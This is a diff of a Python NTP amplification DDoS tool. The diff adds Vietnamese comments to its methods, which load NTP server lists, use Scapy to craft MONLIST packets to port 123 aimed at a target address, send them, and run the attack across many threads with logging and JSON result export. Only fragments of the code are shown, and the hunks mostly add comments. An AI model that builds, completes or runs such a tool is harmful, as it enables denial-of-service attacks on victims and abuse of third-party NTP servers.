@@ -31,7 +31,7 @@ from tqdm import tqdm
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import queue
 
-@dataclass
+@dataclass  
 class AttackStats:
     """Statistics tracking for the attack session"""
     target: str
@@ -65,7 +65,8 @@ class NTPAmplificationTool:
         # Register signal handlers for graceful shutdown
         signal.signal(signal.SIGINT, self._signal_handler)
         signal.signal(signal.SIGTERM, self._signal_handler)
-    
+
+    #Ghi log ra file ntp_amplification.log và console.
     def _setup_logging(self) -> logging.Logger:
         """Setup logging configuration"""
         logging.basicConfig(
@@ -78,6 +79,7 @@ class NTPAmplificationTool:
         )
         return logging.getLogger(__name__)
     
+    #Cho phép dừng script an toàn với Ctrl+C hoặc SIGTERM.
     def _signal_handler(self, signum, frame):
         """Handle graceful shutdown on SIGINT/SIGTERM"""
         self.logger.info("Received shutdown signal, stopping gracefully...")
@@ -86,6 +88,7 @@ class NTPAmplificationTool:
             self.progress_bar.close()
         sys.exit(0)
     
+    #Kiểm tra IP hợp lệ (IPv4 hoặc IPv6).
     def validate_ip_address(self, ip_str: str) -> bool:
         """Validate IPv4 or IPv6 address"""
         try:
@@ -94,6 +97,7 @@ class NTPAmplificationTool:
         except ValueError:
             return False
     
+    #Đọc file, bỏ comment, kiểm tra IP hợp lệ.
     def load_ntp_servers(self, filepath: str) -> List[str]:
         """Load and validate NTP servers from file"""
         try:
@@ -116,7 +120,8 @@ class NTPAmplificationTool:
         except Exception as e:
             self.logger.error(f"Error reading file {filepath}: {e}")
             sys.exit(1)
-    
+
+    #Dùng Scapy để tạo gói UDP đến port 123.Payload cố định \x17\x00\x03* + padding.Tự động xử lý IPv4/IPv6.
     def create_ntp_packet(self, ntp_server: str, target_address: str, sport: int = 51147) -> IP:
         """Create NTP amplification packet with IPv4/IPv6 support"""
         # NTP v2 Monlist pattern
@@ -140,6 +145,7 @@ class NTPAmplificationTool:
             self.logger.error(f"Error creating packet for {ntp_server}: {e}")
             return None
     
+    #Gửi gói MONLIST đến server.Cập nhật thống kê, log lỗi nếu có.
     def send_ntp_packet(self, ntp_server: str, target_address: str, packet_count: int = 1) -> Dict[str, Any]:
         """Send NTP amplification packets to a single server"""
         result = {
@@ -181,6 +187,7 @@ class NTPAmplificationTool:
         
         return result
     
+    #Chạy attack đa luồng
     def run_attack(self, target: str, servers: List[str], threads: int = 10, 
                    packets_per_server: int = 1, delay: float = 0.1) -> List[Dict[str, Any]]:
         """Run the NTP amplification attack with progress tracking"""
@@ -248,6 +255,7 @@ class NTPAmplificationTool:
         
         return results
     
+    #Xuất kết quả
     def save_results_json(self, results: List[Dict[str, Any]], filename: str):
         """Save results to JSON file"""
         output_data = {
